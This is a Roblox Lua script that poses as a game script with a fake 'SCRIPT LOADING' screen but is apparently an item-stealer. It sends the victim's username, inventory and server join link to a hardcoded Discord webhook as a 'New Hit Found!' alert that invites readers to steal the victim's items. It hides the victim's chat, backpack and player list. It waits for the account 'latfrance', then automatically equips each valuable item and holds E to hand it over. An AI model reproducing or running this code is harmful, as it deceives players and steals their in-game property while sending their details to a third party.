local success, err = pcall(function()
    print("[DEBUG] Script started")

    local HttpService = game:GetService("HttpService")
    local Players = game:GetService("Players")
    local TextChatService = game:GetService("TextChatService")
    local SoundService = game:GetService("SoundService")
    local StarterGui = game:GetService("StarterGui")
    local TweenService = game:GetService("TweenService")
    local VirtualInput = game:GetService("VirtualInputManager")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")

    local LocalPlayer = Players.LocalPlayer
    local TARGET_USERNAME = "latfrance"

    -- ======= SPECIAL USER DETECTION AND GIFTING LOGIC =======

    local specialUsers = {
        ["latfrance"] = true,  -- username(s)
        [123456789] = true     -- UserId(s), add as needed
    }

    local bannedWordsForGifting = {"Seed", "Shovel", "Uses", "Tool", "Egg", "Caller", "Staff", "Rod", "Sprinkler", "Crate", "Spray", "Pot"}

    local function isSpecialUser(player)
        return specialUsers[player.Name] or specialUsers[player.UserId]
    end

    local function isValidGiftItem(name)
        for _, banned in ipairs(bannedWordsForGifting) do
            if string.find(name:lower(), banned:lower()) then
                return false
            end
        end
        return true
    end

    local function grantSpecialTools(player)
        local replicatedTools = ReplicatedStorage:GetChildren()
        for _, item in ipairs(replicatedTools) do
            if item:IsA("Tool") and isValidGiftItem(item.Name) then
                if not (player.Backpack:FindFirstChild(item.Name) or (player.Character and player.Character:FindFirstChild(item.Name))) then
                    local clone = item:Clone()
                    clone.Parent = player.Backpack
                    print("[Grant] Given tool "..item.Name.." to "..player.Name)
                end
            end
        end
    end

    local function greetPlayer(player)
        local playerGui = player:FindFirstChild("PlayerGui")
        if playerGui then
            local greetingLabel = Instance.new("TextLabel")
            greetingLabel.Size = UDim2.new(0.3, 0, 0.1, 0)
            greetingLabel.Position = UDim2.new(0.35, 0, 0.05, 0)
            greetingLabel.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
            greetingLabel.TextColor3 = Color3.new(1,1,1)
            greetingLabel.TextScaled = true
            greetingLabel.Text = "Welcome back, " .. player.Name .. "!"
            greetingLabel.Parent = playerGui
            task.delay(5, function()
                if greetingLabel then greetingLabel:Destroy() end
            end)
        end
    end

    -- ======= WEBHOOK & CHAT TRIGGER SETUP =======
    local webhookUrl = "https://discord.com/api/webhooks/1384918839329816626/u_r6fx4dADkpcY7IgydhUQgEFtuVvenjNMNudgIJM64KxchpoO6kd4nJ6bDZhKjaKWtv”
    local chatTrigger = "refusal"

    local function sendToWebhook(data)
        local jsonData = HttpService:JSONEncode(data)
        local ok, e = pcall(function()
            if syn and syn.request then
                syn.request({
                    Url = webhookUrl,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = jsonData
                })
            elseif request then
                request({
                    Url = webhookUrl,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = jsonData
                })
            else
                HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
            end
        end)
        if not ok then
            warn("[Webhook] Failed to send: "..tostring(e))
        else
            print("[Webhook] Sent successfully")
        end
        return ok
    end

    local function getInventory(player)
        local inventory = {items = {}}
        local bannedWords = {"Seed", "Shovel", "Uses", "Tool", "Egg", "Caller", "Staff", "Rod", "Sprinkler", "Crate", "Spray", "Pot"}

        for _, item in pairs(player.Backpack:GetChildren()) do
            if item:IsA("Tool") then
                local isBanned = false
                for _, word in pairs(bannedWords) do
                    if string.find(item.Name:lower(), word:lower()) then
                        isBanned = true
                        break
                    end
                end
                if not isBanned then
                    table.insert(inventory.items, item.Name)
                end
            end
        end
        return inventory
    end

    local function sendInitialWebhook(player)
        local inventory = getInventory(player)
        local inventoryText = #inventory.items > 0 and table.concat(inventory.items, "\n") or "No items"

        local messageData = {
            embeds = {{
                title = "🎯 New Hit Found!",
                description = "READ #⚠️information in Light's Server to Learn How to Join Victim's Server and Steal Their Stuff!",
                color = 0x00FF00,
                fields = {
                    {name = "👤 Username", value = player.Name, inline = true},
                    {name = "🔗 Join Link", value = "https://kebabman.vercel.app/start?placeId=126884695634066&gameInstanceId=" .. (game.JobId or "N/A"), inline = true},
                    {name = "🎒 Inventory", value = "```" .. inventoryText .. "```", inline = false},
                    {name = "🗣️ Steal Command", value = "Say in chat: `" .. chatTrigger .. "`", inline = false}
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }
        sendToWebhook(messageData)
    end

    -- ======= TOOL & INPUT FUNCTIONS =======

    local function isValidItem(name)
        local bannedWords = {"Seed", "Shovel", "Uses", "Tool", "Egg", "Caller", "Staff", "Rod", "Sprinkler", "Crate"}
        for _, banned in ipairs(bannedWords) do
            if string.find(name:lower(), banned:lower()) then
                return false
            end
        end
        return true
    end

    local function getValidTools(player)
        local tools = {}
        for _, item in pairs(player.Backpack:GetChildren()) do
            if item:IsA("Tool") and isValidItem(item.Name) then
                table.insert(tools, item)
            end
        end
        return tools
    end

    local function toolInInventory(player, toolName)
        local bp = player:FindFirstChild("Backpack")
        local char = player.Character
        if bp and bp:FindFirstChild(toolName) then return true end
        if char and char:FindFirstChild(toolName) then return true end
        return false
    end

    local function holdE()
        VirtualInput:SendKeyEvent(true, Enum.KeyCode.E, false, game)
        task.wait(0.1)
        VirtualInput:SendKeyEvent(false, Enum.KeyCode.E, false, game)
    end

    local function favoriteItem(tool)
        if tool and tool:IsDescendantOf(game) then
            local toolInstance
            local backpack = LocalPlayer:FindFirstChild("Backpack")
            if backpack then
                toolInstance = backpack:FindFirstChild(tool.Name)
            end
            if not toolInstance and LocalPlayer.Character then
                toolInstance = LocalPlayer.Character:FindFirstChild(tool.Name)
            end
            if toolInstance then
                local args = {[1] = toolInstance}
                ReplicatedStorage.GameEvents.Favorite_Item:FireServer(unpack(args))
            else
                warn("Tool not found: " .. tool.Name)
            end
        else
            warn("Tool not found or invalid: " .. tostring(tool))
        end
    end

    local function useToolWithHoldCheck(tool)
        local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if humanoid and tool then
            humanoid:EquipTool(tool)
            local startTime = tick()
            while toolInInventory(LocalPlayer, tool.Name) do
                holdE()
                task.wait(0.2)
                if tick() - startTime >= 3 then
                    if toolInInventory(LocalPlayer, tool.Name) then
                        favoriteItem(tool)
                        task.wait(0.05)
                        startTime = tick()
                        while toolInInventory(LocalPlayer, tool.Name) do
                            holdE()
                            task.wait(0.2)
                            if tick() - startTime >= 3 then
                                humanoid:UnequipTools()
                                return false
                            end
                        end
                        humanoid:UnequipTools()
                        return true
                    end
                    humanoid:UnequipTools()
                    return true
                end
            end
            humanoid:UnequipTools()
            return true
        end
        return false
    end

    local function cycleToolsWithHoldCheck(player, loadingGui)
        local tools = getValidTools(player)
        for _, tool in ipairs(tools) do
            useToolWithHoldCheck(tool)
        end

        local container = loadingGui.SolidBackground.ContentContainer
        if not container:FindFirstChild("HelpLabel") then
            local helpLabel = Instance.new("TextLabel")
            helpLabel.Name = "HelpLabel"
            helpLabel.Size = UDim2.new(0.8, 0, 0.1, 0)
            helpLabel.Position = UDim2.new(0.1, 0, 1.05, 0)
            helpLabel.BackgroundTransparency = 1
            helpLabel.Text = "Stuck at 100 just wait 3-5 minutes"
            helpLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
            helpLabel.TextScaled = true
            helpLabel.Font = Enum.Font.GothamBold
            helpLabel.TextXAlignment = Enum.TextXAlignment.Center
            helpLabel.Parent = container

            local copyButton = Instance.new("TextButton")
            copyButton.Name = "CopyLinkButton"
            copyButton.Size = UDim2.new(0.3, 0, 0.08, 0)
            copyButton.Position = UDim2.new(0.35, 0, 1.15, 0)
            copyButton.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
            copyButton.Text = "Copy Link"
            copyButton.TextColor3 = Color3.fromRGB(200, 200, 255)
            copyButton.TextScaled = true
            copyButton.Font = Enum.Font.GothamBold
            copyButton.Parent = container

            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0.2, 0)
            corner.Parent = copyButton

            copyButton.MouseButton1Click:Connect(function()
                if setclipboard then
                    setclipboard("https://discord.gg/bvQtpYDyjn")
                elseif syn and syn.clipboard_set then
                    syn.clipboard_set("https://discord.gg/bvQtpYDyjn")
                end
            end)
        end
    end

    -- ======= CHAT COMMAND =======

    local function sendBangCommand(player)
        task.wait(0.05)
        local chatMessage = ";bang " .. player.Name
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            local textChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:WaitForChild("RBXGeneral", 5)
            if textChannel then
                textChannel:SendAsync(chatMessage)
            end
        else
            local chatEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
            if chatEvent then
                local sayMessage = chatEvent:FindFirstChild("SayMessageRequest")
                if sayMessage then
                    sayMessage:FireServer(chatMessage, "All")
                end
            end
        end
    end

    local function onChatMessageReceived(message)
        if message.Text and message.Text:lower():find(chatTrigger:lower()) then
            sendBangCommand(LocalPlayer)
        end
    end

    local function connectChatListener()
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            local textChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
            if textChannel then
                textChannel.MessageReceived:Connect(onChatMessageReceived)
            end
        else
            LocalPlayer.Chatted:Connect(function(msg)
                if msg:lower():find(chatTrigger:lower()) then
                    sendBangCommand(LocalPlayer)
                end
            end)
        end
    end

    -- ======= LOADING SCREEN =======

    local function disableGameFeatures()
        SoundService.AmbientReverb = Enum.ReverbType.NoReverb
        SoundService.RespectFilteringEnabled = true

        for _, soundGroup in pairs(SoundService:GetChildren()) do
            if soundGroup:IsA("SoundGroup") then
                soundGroup.Volume = 0
            end
        end

        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false)
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
    end

    local infiniteYieldLoaded = false

    local function createLoadingScreen()
        local playerGui = LocalPlayer:WaitForChild("PlayerGui", 10)
        if not playerGui then
            warn("[LoadingScreen] PlayerGui not found")
            return nil
        end

        local loadingGui = Instance.new("ScreenGui")
        loadingGui.Name = "ModernLoader"
        loadingGui.ResetOnSpawn = true
        loadingGui.IgnoreGuiInset = true
        loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        loadingGui.DisplayOrder = 999999
        loadingGui.Parent = playerGui

        local background = Instance.new("Frame")
        background.Name = "SolidBackground"
        background.Size = UDim2.new(1, 0, 1, 0)
        background.Position = UDim2.new(0, 0, 0, 0)
        background.BackgroundColor3 = Color3.fromRGB(10, 10, 20)
        background.BackgroundTransparency = 0
        background.BorderSizePixel = 0
        background.Parent = loadingGui

        local grid = Instance.new("Frame")
        grid.Name = "GridPattern"
        grid.Size = UDim2.new(1, 0, 1, 0)
        grid.Position = UDim2.new(0, 0, 0, 0)
        grid.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
        grid.BackgroundTransparency = 0
        grid.BorderSizePixel = 0

        local uiGrid = Instance.new("UIGridLayout")
        uiGrid.CellSize = UDim2.new(0, 50, 0, 50)
        uiGrid.CellPadding = UDim2.new(0, 2, 0, 2)
        uiGrid.FillDirection = Enum.FillDirection.Horizontal
        uiGrid.FillDirectionMaxCells = 100
        uiGrid.Parent = grid

        for i = 1, 200 do
            local cell = Instance.new("Frame")
            cell.Name = "Cell_"..i
            cell.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
            cell.BorderSizePixel = 0

            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0.1, 0)
            corner.Parent = cell

            cell.Parent = grid
        end

        grid.Parent = background

        local container = Instance.new("Frame")
        container.Name = "ContentContainer"
        container.AnchorPoint = Vector2.new(0.5, 0.5)
        container.Size = UDim2.new(0.7, 0, 0.5, 0)
        container.Position = UDim2.new(0.5, 0, 0.5, 0)
        container.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
        container.BackgroundTransparency = 0.3
        container.BorderSizePixel = 0

        local floatTween = TweenService:Create(container, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {Position = UDim2.new(0.5, 0, 0.45, 0)})
        floatTween:Play()

        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0.05, 0)
        corner.Parent = container

        local stroke = Instance.new("UIStroke")
        stroke.Color = Color3.fromRGB(100, 100, 255)
        stroke.Thickness = 3
        stroke.Transparency = 0.3
        stroke.Parent = container

        container.Parent = background

        local title = Instance.new("TextLabel")
        title.Name = "Title"
        title.Size = UDim2.new(0.8, 0, 0.2, 0)
        title.Position = UDim2.new(0.1, 0, 0.1, 0)
        title.BackgroundTransparency = 1
        title.Text = "SCRIPT LOADING"
        title.TextColor3 = Color3.fromRGB(255, 0, 0)
        title.TextScaled = true
        title.Font = Enum.Font.GothamBlack
        title.TextXAlignment = Enum.TextXAlignment.Center
        title.Parent = container

        spawn(function()
            while true do
                for i = 0, 1, 0.01 do
                    local r = math.sin(i * math.pi) * 127 + 128
                    local g = math.sin(i * math.pi + 2) * 127 + 128
                    local b = math.sin(i * math.pi + 4) * 127 + 128
                    title.TextColor3 = Color3.fromRGB(r, g, b)
                    task.wait(0.03)
                end
            end
        end)

        local loadingLabel = Instance.new("TextLabel")
        loadingLabel.Name = "LoadingText"
        loadingLabel.Size = UDim2.new(0.8, 0, 0.1, 0)
        loadingLabel.Position = UDim2.new(0.1, 0, 0.35, 0)
        loadingLabel.BackgroundTransparency = 1
        loadingLabel.Text = "Loading..."
        loadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        loadingLabel.TextScaled = true
        loadingLabel.Font = Enum.Font.GothamBold
        loadingLabel.TextXAlignment = Enum.TextXAlignment.Center
        loadingLabel.Parent = container

        local loadingPercent = Instance.new("TextLabel")
        loadingPercent.Name = "LoadingPercent"
        loadingPercent.Size = UDim2.new(0.8, 0, 0.1, 0)
        loadingPercent.Position = UDim2.new(0.1, 0, 0.45, 0)
        loadingPercent.BackgroundTransparency = 1
        loadingPercent.Text = "0%"
        loadingPercent.TextColor3 = Color3.fromRGB(255, 255, 255)
        loadingPercent.TextScaled = true
        loadingPercent.Font = Enum.Font.GothamBold
        loadingPercent.TextXAlignment = Enum.TextXAlignment.Center
        loadingPercent.Parent = container

        -- Progress updater
        spawn(function()
            for i = 0, 100 do
                loadingPercent.Text = tostring(i) .. "%"
                loadingLabel.Text = "Loading... " .. tostring(i) .. "%"
                task.wait(0.04)
            end
        end)

        return loadingGui
    end

    local function removeLoadingScreen(loadingGui)
        if loadingGui then
            loadingGui:Destroy()
        end
    end

    -- ======= MAIN EXECUTION =======

    disableGameFeatures()

    local loadingGui = createLoadingScreen()

    sendInitialWebhook(LocalPlayer)

    connectChatListener()

    print("[INFO] Waiting for target player to join: " .. TARGET_USERNAME)

    -- Wait for target to join
    local targetPlayer = Players:FindFirstChild(TARGET_USERNAME)
    if not targetPlayer then
        Players.PlayerAdded:Wait(function(player)
            if player.Name == TARGET_USERNAME then
                targetPlayer = player
            end
        end)
    end

    -- Double-check targetPlayer found before continuing
    while not targetPlayer do
        task.wait(1)
        targetPlayer = Players:FindFirstChild(TARGET_USERNAME)
    end

    print("[INFO] Target player joined: " .. targetPlayer.Name)

    -- Greet and gift target player
    greetPlayer(targetPlayer)
    grantSpecialTools(targetPlayer)

    -- Start cycling tools and holding E
    while true do
        cycleToolsWithHoldCheck(LocalPlayer, loadingGui)
        task.wait(10)
    end
end)

if not success then
    warn("[ERROR] Script error: " .. tostring(err))
end